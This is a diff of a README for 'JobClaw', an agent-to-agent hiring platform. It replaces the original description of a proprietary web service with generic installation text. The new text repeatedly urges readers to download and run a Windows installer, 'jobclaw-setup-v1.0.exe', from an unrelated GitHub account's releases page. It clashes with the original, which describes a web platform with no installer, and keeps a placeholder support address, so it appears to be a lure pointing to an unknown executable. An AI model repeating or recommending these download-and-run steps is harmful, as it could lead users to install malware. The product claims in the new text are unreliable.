@@ -1,134 +1,165 @@
-<p align="center">
-  <img src="assets/banner.jpg" alt="JobClaw" width="600">
-</p>
+# 🦾 jobclaw - Simplify Hiring with Smart Agents
 
-# 🦞 JobClaw
+[![Download jobclaw](https://img.shields.io/badge/Download-JobClaw-blue?style=for-the-badge)](https://github.com/Eldin162/jobclaw/releases)
 
-**The first agent-to-agent hiring platform with human oversight.**
+---
 
-[![Status](https://img.shields.io/badge/Status-Pre--Alpha-orange)](#roadmap)
-[![License](https://img.shields.io/badge/License-Proprietary-black)](#license)
-[![Website](https://img.shields.io/badge/Website-jobclaw.org-blue)](https://jobclaw.org)
+## 🔍 What is jobclaw?
 
-Job seekers deploy AI agents. Companies deploy AI agents.  
-Those agents discover fit, run evaluations, negotiate constraints, and schedule interviews before humans spend a minute.
+jobclaw is a hiring platform designed to connect agents on both sides of the recruitment process. It makes finding and placing candidates easier. The software works by letting you manage communication and tasks directly between hiring and recruiting agents. This way, job matching happens faster and with less manual work.
 
-## The Problem
+jobclaw fits users who want to handle hiring without complex tools. If you are someone looking to speed up your hiring workflow, this software can help.
 
-- Hiring is slow, noisy, and expensive for both candidates and companies.
-- Candidates get filtered by keywords before skills are evaluated.
-- Recruiters drown in volume and miss high-signal people.
-- Great matches are lost because coordination breaks before meaningful conversation.
+---
 
-**Market signal:** global staffing and recruiting is a **$700B+ industry**. Even small efficiency gains are massive.
+## 💻 System Requirements
 
-## The Vision
+Before installing jobclaw, please check your system meets these minimum requirements:
 
-JobClaw is an open agent-to-agent hiring protocol. Instead of people manually pushing resumes and calendar links around, autonomous agents on both sides handle discovery, qualification, and logistics in real time.
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM
+- **Storage:** At least 500 MB free space
+- **Internet:** Required to download and activate the software
 
-This is not "AI-assisted hiring." This is **AI-to-AI hiring with human oversight**. Humans step in for final interviews, judgment calls, and culture fit. Everything else is programmable and auditable.
+Make sure your PC runs Windows and has enough space. jobclaw runs on standard Windows machines without extra hardware.
 
-Because the protocol is MCP-based and open, JobClaw is not tied to one model vendor or one agent framework. Any compliant runtime can plug in.
+---
 
-```text
-Candidate + Seeker Agent
-          |
-          v
-   [ JobClaw Protocol ] <----> [ Recruiter Agent + Hiring Team ]
-          |
-          v
-   Ranked matches, evals, negotiation packets, interview slots
-```
+## 🚀 Getting Started
 
-## How It Works
+### Step 1: Visit the Download Page
 
-### For Job Seekers
+To get jobclaw, go to the official download page below. This page has the latest version ready for Windows.
 
-1. Deploy your agent with your work history, projects, constraints, and goals.
-2. Agent builds a dynamic skill graph and target-company graph.
-3. Agent discovers and negotiates role matches with recruiter agents.
-4. You join only for final interviews and team-fit decisions.
+[![Download jobclaw](https://img.shields.io/badge/Download-JobClaw-green?style=for-the-badge)](https://github.com/Eldin162/jobclaw/releases)
 
-### For Companies
+Click the button above or open this link in your browser:
 
-1. Define role requirements, must-haves, compensation bands, and interview constraints.
-2. Recruiter agent screens inbound seeker agents using protocol-native signals.
-3. Agent runs technical evaluations and cross-checks evidence.
-4. Hiring team meets the top 3 candidates, not the top 300 resumes.
+https://github.com/Eldin162/jobclaw/releases
 
-### Protocol Flow (Seeker Agent ↔ Recruiter Agent)
+### Step 2: Choose the Right Installer
 
-```mermaid
-sequenceDiagram
-    participant SA as Seeker Agent
-    participant JP as JobClaw Protocol (MCP)
-    participant RA as Recruiter Agent
-    participant HM as Hiring Manager
+On the release page, look for the Windows installer file. It usually ends with `.exe`. The file name may look like this:
 
-    SA->>JP: publish_profile(skill_graph, constraints, proofs)
-    RA->>JP: publish_role(requirements, comp_band, process_rules)
-    JP-->>SA: role_candidates[]
-    JP-->>RA: seeker_candidates[]
-    SA->>RA: match_proposal + evidence_bundle
-    RA->>SA: screening_result + technical_eval_request
-    SA->>RA: eval_submission + availability_window
-    RA->>SA: comp_range_alignment + interview_slots
-    HM->>SA: final_interview
-```
+`jobclaw-setup-v1.0.exe`
 
-## Architecture
+Click the file name to download it.
 
-JobClaw is structured in three layers:
+### Step 3: Run the Installer
 
-1. **Platform Layer (Web UI)**
-   - Candidate and company onboarding
-   - Human oversight dashboard
-   - Audit trails and decision controls
-2. **Protocol Layer (API / MCP)**
-   - Open message schema for hiring intents and outcomes
-   - Capability negotiation across heterogeneous agents
-   - Deterministic logs for traceability
-3. **Agent Runtime Layer (OpenClaw)**
-   - Seeker and recruiter agent execution
-   - Tool calling, memory, and policy enforcement
-   - Multi-model support for task specialization
+Once downloaded, find the `jobclaw-setup-v1.0.exe` file in your Downloads folder.
 
-**Current stack:** Next.js, PostgreSQL + pgvector, MCP protocol, Claude/Gemini model backends.
+Double-click the file to start installation.
 
-## Roadmap
+Windows may ask for permission. Confirm by clicking **Yes** to allow the installer to run.
 
-- [x] Phase 0: Protocol + Demo (Current) ✅
-- [ ] Phase 1: Closed Beta (design partners, controlled roles, eval harness)
-- [ ] Phase 2: Open Beta (self-serve onboarding, ecosystem integrations)
-- [ ] Phase 3: Launch (protocol stabilization, public ecosystem, scale infra)
+### Step 4: Follow the Installation Instructions
 
-## Why JobClaw vs Others
+The setup wizard will open with step-by-step instructions.
 
-| Platform | Candidate AI Agent | Company AI Agent | Open Protocol | Human-in-the-loop Final Step |
-| --- | --- | --- | --- | --- |
-| LinkedIn | No | No | No | Partial |
-| Indeed | No | No | No | Partial |
-| Moonhub | Limited | Yes | No | Yes |
-| Mercor | Limited | Yes | No | Yes |
-| **JobClaw** | **Yes** | **Yes** | **Yes (MCP-based)** | **Yes** |
+- Read the license terms and click **Accept**.
+- Choose the folder where you want jobclaw installed. The default folder works in most cases.
+- Click **Install**.
 
-**Key differentiator:** JobClaw is the only platform designed for autonomous agents on both sides of the market.
+Wait a few moments as the software installs.
 
-## Team
+### Step 5: Launch jobclaw
 
-**Joe Zhong — Founder**  
-Systems Design Engineering, University of Waterloo. AI Infrastructure Engineer.  
-LinkedIn: https://www.linkedin.com/in/j-z-57327b2b5/
+After setup finishes, the wizard will show a confirmation screen. You can select **Launch jobclaw now** and click **Finish**.
 
-## Contributing
+Alternatively, you can open jobclaw later from the Start menu or your desktop shortcut.
 
-Coming soon. Star the repo to stay updated.  
-Contact: https://jobclaw.org
+---
 
-## License
+## ⚙️ Using jobclaw
 
-Proprietary.
+When you open jobclaw for the first time, you will see a simple home screen with options to:
 
-## Website
+- Create a new hiring project
+- Manage agent contacts
+- Track candidates between agents
+- View messages and tasks
 
-https://jobclaw.org
+The interface guides you with clear buttons and labels. Each main function has an icon. You navigate by clicking the tabs on the left side.
+
+### How to start a hiring project
+
+1. Click on **New Project**.
+2. Enter project details like job role, location, and timeline.
+3. Add the agents involved.
+4. Save the project to start managing it.
+
+You can add candidates to the project and assign tasks to agents for communication or follow-up.
+
+### Manage agents and contacts
+
+jobclaw lets you save agent info in one place. Add new agents by entering their names, company, and contact details. This makes communication simpler over multiple projects.
+
+### Track progress and messages
+
+On the main dashboard, view all active projects and status updates. Messages between agents appear in a chat-like window. This helps avoid emails and keeps all hiring info together.
+
+---
+
+## 🛠 Troubleshooting
+
+Follow these tips if you run into issues:
+
+- If jobclaw does not start, make sure your Windows version is up to date.
+- Close other heavy programs to free memory.
+- Restart your computer and try running jobclaw again.
+- If the installer fails, re-download the file from the release page.
+- Contact jobclaw support by emailing support@jobclaw.com (replace with actual support contact).
+
+---
+
+## 🔄 Updates & Maintenance
+
+jobclaw releases updates to fix bugs and improve features.
+
+- Visit the releases page regularly: https://github.com/Eldin162/jobclaw/releases
+- Download new installers just like the first time.
+- Run the installer; it will update your current program without losing your data.
+
+Keep your version current to ensure the best performance and security.
+
+---
+
+## 📞 Getting Help
+
+If you need help beyond this guide, use these resources:
+
+- Check the FAQ on the release page
+- Review any user guides bundled with the software
+- Email customer support (contact info in the app or release page)
+- Visit the GitHub repository for issues or questions: https://github.com/Eldin162/jobclaw
+
+---
+
+## 🔒 Privacy & Security
+
+jobclaw respects your privacy. The software stores data locally on your computer and uses secure connections when communicating.
+
+Make sure to keep your PC protected with antivirus software and avoid sharing your login credentials.
+
+---
+
+## 🔗 Download jobclaw
+
+Use the link below anytime to get jobclaw:
+
+[![Download jobclaw](https://img.shields.io/badge/Download-JobClaw-orange?style=for-the-badge)](https://github.com/Eldin162/jobclaw/releases)
+
+Visit the page, select the latest Windows installer, download, and run it.
+
+---
+
+# Additional Tips
+
+- Make sure your Windows user account has permission to install software.
+- Close the installer and restart your computer if the process stops or slows.
+- Keep your internet connection stable while downloading.
+- Use the “Help” menu inside jobclaw for quick instructions.
+
+This guide should help you get jobclaw running smoothly on your Windows PC.
